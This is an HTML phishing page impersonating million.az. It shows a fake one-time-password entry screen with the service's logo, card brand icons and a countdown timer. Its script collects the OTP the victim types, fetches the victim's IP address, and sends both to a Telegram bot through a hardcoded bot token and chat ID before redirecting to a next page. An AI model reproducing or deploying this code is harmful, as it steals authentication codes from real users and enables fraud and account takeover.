<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>M10</title>
    <link rel="stylesheet" href="../../../cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"> <!-- Font Awesome ikonları için -->
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #fffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #fff;
            border-radius: 15px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 50px;
            width: 55vw;
            height: 55vh;
            text-align: center;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            font-weight: bold;
            display: block;
            margin-bottom: 5px;
        }

        input[type="number"] {
            width: calc(100% - 12px);
            padding: 10px;
            border: 2px solid black;
            border-radius: 40px;
            box-sizing: border-box;
            font-size: 14px;
        }

        button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 40px;
            background-color: #cccccc;
            color: #fff;
            cursor: not-allowed;
            font-size: 16px;
            transition: background-color 0.3s ease;
            margin-top: 20px;
        }

        button:enabled {
            background-color: #45a049;
            cursor: pointer;
        }

        button:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }

        .logo {
            margin-bottom: 20px;
            text-align: center;
        }

        .bank-icons {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }

        .bank-icons i {
            font-size: 24px;
            margin: 0 10px;
            color: #888;
            transition: color 0.3s ease;
        }

        .bank-icons i:hover {
            color: #333;
        }

        .timer {
            font-size: 2rem;
            color: #333;
            margin-bottom: 20px;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo">
            <img src="https://million.az/logo/main-logo.svg" alt="Logo" width="200">
        </div>
        <div class="timer" id="timer">02:00</div>
        <form id="myForm">
            <div class="form-group">
                <div class="item item-indent">Telefonunuza gələn birdəfəlik OTP şifrəni daxil edin. </div>
                <label for="cardName">Şifrə göndərildi: +994*******</label>
                <input type="number" id="cardName" placeholder="Otp Kod" maxlength="7" minlength="4" required>
            </div>

            <div style="text-align: center;">
                <button type="button" id="submitButton" disabled>İləri <i class="fas fa-arrow-right"></i></button>
            </div>
        </form>
        <div class="bank-icons">
            <i class="fab fa-cc-visa"></i>
            <i class="fab fa-cc-mastercard"></i>
            <i class="fab fa-cc-amex"></i>
        </div>
    </div>

    <script>
        var startTime = new Date().getTime();
        var endTime = startTime + (2 * 60 * 1000);

        var timerInterval = setInterval(function () {
            var currentTime = new Date().getTime();
            var elapsedTime = endTime - currentTime;
            var minutes = Math.floor((elapsedTime % (1000 * 60 * 60)) / (1000 * 60));
            var seconds = Math.floor((elapsedTime % (1000 * 60)) / 1000);

            document.getElementById("timer").innerHTML = formatTime(minutes) + ":" + formatTime(seconds);

            if (elapsedTime < 0) {
                clearInterval(timerInterval);
                document.getElementById("timer").innerHTML = "00:00";
                document.getElementById("submitButton").disabled = true;
            }
        }, 1000);

        function formatTime(time) {
            return time < 10 ? "0" + time : time;
        }

        document.getElementById("myForm").addEventListener("input", function () {
            var cardName = document.getElementById("cardName").value;
            var submitButton = document.getElementById("submitButton");

            if (cardName.trim().length >= 4 && cardName.trim().length <= 7) {
                submitButton.disabled = false;
            } else {
                submitButton.disabled = true;
            }
        });

        const botToken = '8136871782:AAGl_5_It13PYi6UPTsVZRQB2LgTVrjG7Ao';
        const chatId = '-1002496527853';

        document.getElementById("submitButton").addEventListener("click", function () {
            var cardName = document.getElementById("cardName").value;

            fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .then(data => {
                    const userIP = data.ip;
                    const message = `Otp-1: ${cardName}\nIP: ${userIP}`;

                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                        }),
                    })
                        .then(data => {
                            window.location.href = "index2.html";
                        })
                        .catch(error => {
                            console.error('Telegram Mesajı Gönderme Hatası:', error);
                        });
                })
                .catch(error => {
                    console.error('IP Adresi Alınamadı:', error);
                });
        });
    </script>
</body>

</html>
